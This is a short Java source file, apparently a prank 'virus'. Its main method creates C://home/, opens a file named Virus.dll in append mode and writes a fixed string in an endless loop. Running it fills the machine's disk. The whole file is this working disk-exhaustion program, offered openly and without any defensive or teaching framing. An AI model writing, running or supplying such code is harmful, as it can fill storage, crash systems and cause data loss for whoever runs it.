/*
 * To change this license header, choose License Headers in Project Properties.
 * To change this template file, choose Tools | Templates
 * and open the template in the editor.
 */
package n1;

import java.io.FileNotFoundException;
import java.io.FileWriter;
import java.io.IOException;
import java.nio.file.Files;
import java.nio.file.Paths;

/**
 *
 * @author laatuji
 */
public class N1 {

    public static void main(String ar[]) {
        try {
            Files.createDirectories(Paths.get("C://home//"));
            FileWriter f = new FileWriter("C://home//Virus.dll", true);
            //FileWriter f=new FileWriter("/home/anuj.txt",true);
            while (true) {
                f.write("Programming Is Such A FUN !!!");
            }
        } catch (FileNotFoundException e) {
            System.out.println(e);
        } catch (IOException e) {
            System.out.println(e);
        }
    }
}
